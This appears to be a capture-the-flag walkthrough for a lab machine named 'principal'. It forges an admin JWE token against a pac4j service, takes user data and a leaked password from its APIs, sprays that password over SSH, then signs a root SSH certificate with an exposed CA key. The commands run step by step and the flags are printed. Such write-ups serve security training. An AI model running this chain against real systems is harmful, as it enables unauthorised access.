
## 1. Reconnaissance

An initial Nmap scan identified three open services:

```
nmap -sV principal.htb

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
53/tcp   open  domain?
8080/tcp open  http-proxy Jetty
```

The service fingerprint on port 8080 confirmed a **Jetty** server with `X-Powered-By: pac4j-jwt/6.0.3`, and every request to `/` redirected (`302`) to `/login` — a stateless, JWT/JWE-protected web application.

## 2. Enumeration

### 2.1 Framework and version fingerprinting

The application identified itself as running **pac4j** version **1.20** (application-level version, distinct from the `pac4j-jwt` library version `6.0.3` seen in HTTP headers). This version is affected by **CVE-2026-29000**, an authentication-bypass vulnerability in how pac4j handles JWE (encrypted JWT) tokens: an attacker who can fetch the server's public JWKS can craft a token that the server will decrypt and trust as a valid, arbitrarily-privileged session — without ever authenticating.

### 2.2 Exploiting CVE-2026-29000 (JWE forgery)

Using a public proof-of-concept for the CVE, a forged token was generated directly from the exposed JWKS endpoint, requesting the `admin` user and the `ROLE_ADMIN` role:

```bash
python3 'CVE-2026-29000 PoC.py' \
  --jwks http://principal.htb:8080/api/auth/jwks \
  --user admin --role ROLE_ADMIN
```

```
[*] Fetching JWKS...
[+] Public key loaded
[+] PlainJWT created

=== Malicious JWE Token ===
eyJhbGciOiAiUlNBLU9BRVAtMjU2Ii... (truncated)
```

This forged JWE is accepted by the server as a fully authenticated admin session.

### 2.3 Mapping the API surface

Inspecting the client-side JavaScript bundle (`app.js`) revealed the full set of API endpoints:

```js
const API_BASE = '';
const JWKS_ENDPOINT   = '/api/auth/jwks';
const AUTH_ENDPOINT   = '/api/auth/login';
const DASHBOARD_ENDPOINT = '/api/dashboard';
const USERS_ENDPOINT  = '/api/users';
const SETTINGS_ENDPOINT = '/api/settings';
```

### 2.4 Dumping user accounts

Using the forged admin token against `/api/users` returned the full user directory:

```bash
curl -s http://principal.htb:8080/api/users -H "Authorization: Bearer <forged_jwe>"
```

```json
{"total":8,"users":[
  {"username":"admin","email":"s.chen@principal-corp.local","role":"ROLE_ADMIN"},
  {"username":"svc-deploy","email":"svc-deploy@principal-corp.local","role":"deployer",
   "note":"Service account for automated deployments via SSH certificate auth."},
  {"username":"jthompson","role":"ROLE_USER"},
  {"username":"amorales","role":"ROLE_USER"},
  {"username":"bwright","role":"ROLE_MANAGER"},
  {"username":"kkumar","role":"ROLE_ADMIN","active":false},
  {"username":"mwilson","role":"ROLE_USER"},
  {"username":"lzhang","role":"ROLE_MANAGER"}
]}
```

The `svc-deploy` account note — _"Service account for automated deployments via SSH certificate auth"_ — was the first strong signal pointing toward an SSH Certificate Authority being used somewhere on the host.

### 2.5 Critical disclosure via `/api/settings`

The same admin token unlocked `/api/settings`, which leaked internal infrastructure details, including a plaintext credential:

```bash
curl -s http://principal.htb:8080/api/settings -H "Authorization: Bearer <forged_jwe>"
```

```json
{
  "infrastructure": {
    "sshCaPath": "/opt/principal/ssh/",
    "sshCertAuth": "enabled",
    "notes": "SSH certificate auth configured for automation - see /opt/principal/ssh/ for CA config."
  },
  "security": {
    "authFramework": "pac4j-jwt",
    "jwtAlgorithm": "RS256",
    "jweAlgorithm": "RSA-OAEP-256",
    "encryptionKey": "D3pl0y_$$H_Now42!"
  }
}
```

This single response provided two actionable leads: a candidate password (`D3pl0y_$$H_Now42!`) and the exact filesystem path of an SSH CA (`/opt/principal/ssh/`).

## 3. Foothold — Password Reuse

The leaked `encryptionKey` was tested as an SSH password against all 8 enumerated usernames:

```bash
for u in admin svc-deploy jthompson amorales bwright kkumar mwilson lzhang; do
  echo "=== $u ==="
  sshpass -p 'D3pl0y_$$H_Now42!' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
    -o PreferredAuthentications=password -o PubkeyAuthentication=no \
    "$u@principal.htb" "id" 2>&1
done
```

Only one account accepted it:

```
=== svc-deploy ===
uid=1001(svc-deploy) gid=1002(svc-deploy) groups=1002(svc-deploy),1001(deployers)
```

Note that `svc-deploy` belongs to the **`deployers`** group — a detail that becomes critical in the next stage.

## 4. User Flag

```
svc-deploy@principal:~$ cat user.txt
f9291d78880a2ffb5955dce07754e92f
```

## 5. Privilege Escalation — SSH CA Private Key Exposure

### 5.1 Locating the CA material

The `sshCaPath` leaked earlier pointed directly to the relevant directory. Group membership in `deployers` granted read access:

```bash
ls -la /opt/principal/ssh/
```

```
drwxr-x--- 2 root deployers 4096 Mar 11  2026 .
-rw-r----- 1 root deployers  288 Mar  5  2026 README.txt
-rw-r----- 1 root deployers 3381 Mar  5  2026 ca        # CA private key
-rw-r--r-- 1 root root       742 Mar  5  2026 ca.pub     # CA public key
```

`README.txt` confirmed the purpose explicitly:

```
CA keypair for SSH certificate automation.
This CA is trusted by sshd for certificate-based authentication.
Use deploy.sh to issue short-lived certificates for service accounts.
Algorithm: RSA 4096-bit
```

In other words: **whoever holds this private key can sign an SSH certificate for any principal — including `root` — and `sshd` will trust it unconditionally**, because `TrustedUserCAKeys` on the server points to the matching `ca.pub`.

### 5.2 Forging a root certificate

```bash
# Copy the CA private key locally
cat /opt/principal/ssh/ca > /tmp/ca
chmod 600 /tmp/ca

# Generate a fresh keypair to be certified
ssh-keygen -t rsa -b 4096 -f /tmp/mykey -N ""

# Sign our public key as a certificate valid for the "root" principal
ssh-keygen -s /tmp/ca -I "svc-deploy-impersonation" -n root -V +52w /tmp/mykey.pub
```

```
Signed user key /tmp/mykey-cert.pub: id "svc-deploy-impersonation" serial 0
for root valid from 2026-10-01T10:31:00 to 2027-09-30T10:32:21
```

### 5.3 Authenticating as root

SSH automatically picks up the matching `-cert.pub` file alongside the private key:

```bash
ssh -i /tmp/mykey root@localhost
```

```
root@principal:~# id
uid=0(root) gid=0(root) groups=0(root)
```

## 6. Root Flag

```
root@principal:~# cat /root/root.txt
75a01e62d9a3d2c1b5034ddf839ee503
```
